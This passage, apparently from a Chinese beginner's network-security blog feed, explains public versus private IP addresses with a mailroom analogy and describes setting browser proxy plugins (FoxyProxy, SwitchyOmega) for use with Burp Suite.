-<p>IP地址就像家庭地址一样，公网IP是小区地址，小区中又有很多住户，内网ip就像你家具体的门牌号，你可以从小区里出去（内网ip能连接到互联网），但是外人进入你家需要进行验证（公网IP无法直接连接到内网ip）<br>具体操作<br>用邮寄系统作比喻。有公网ip，相当于说你有一个详细的地址，你可以写信寄给别人，别人也可以用这个地址和你进行各种通讯。<br>来看看没有公网ip是一种什么局面。这就像是住在一个大院里 ，所有进出邮件都由传达室转交。如果是普通的邮件，可以放在传达室，传达室的大爷大妈看到你了就会转交给你，或者你自己去传达室看看，这不重要，反正虽然经过了一点波折，还是可以看到邮件的。假设以下如果来了个挂号，邮局的人员说：必须本人签收。传达室的大爷就说了：对不起，所有的邮件都要经过我中转~。于是邮局的人员只好把信带回去了……<br>实际情况和这个差不多，所谓没有公网ip，就是说你的机子并非直接连接上internet，而是所有通讯经过一台代理（一般是透明网关）进行中转，这时候问题就来了，就会有一些通讯无法在这种机制下顺利进行。比如两个网吧之间，网吧的机子是没有公网 ip的典型例子，通常两个网吧之间通过QQ传送文件就不是直接两台机器建立连接传输的，而是通过QQ的公网服务器进行中转传输了。又比如没有公网ip，上网玩对战游戏通常会有问题，你建立的游戏别人无法加入等等，当然通过服务提供商的公网服务器中转还是可以达成两个没有公网IP的机器进行交流的。</p>
-<hr>
-<p>​       <strong>第四：使用burp suite时浏览器的代理设置。</strong></p>
-<p><strong>1.火狐浏览器安装插件</strong></p>
-<h1 id="FoxyProxy-标准版"><a href="#FoxyProxy-标准版" class="headerlink" title="FoxyProxy 标准版"></a>FoxyProxy 标准版</h1><p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651370687313-39151ef7-4f02-4207-b095-7bc7f2a593f8.png" alt="img"></p>
-<p>2.Edge浏览器安装插件</p>
-<h1 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h1><p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651370760581-fdf5355f-64a6-4b92-afdc-51d4c5a7198a.png" alt="img"></p>
-<p>什么时候用就打开。</p>
-<ul>
-<li><strong>注：平常安装的burp suite只能抓取   http://   不能抓取   https://</strong></li>
-</ul>
 ]]></content>
       <categories>
         <category>网安基础篇</category>
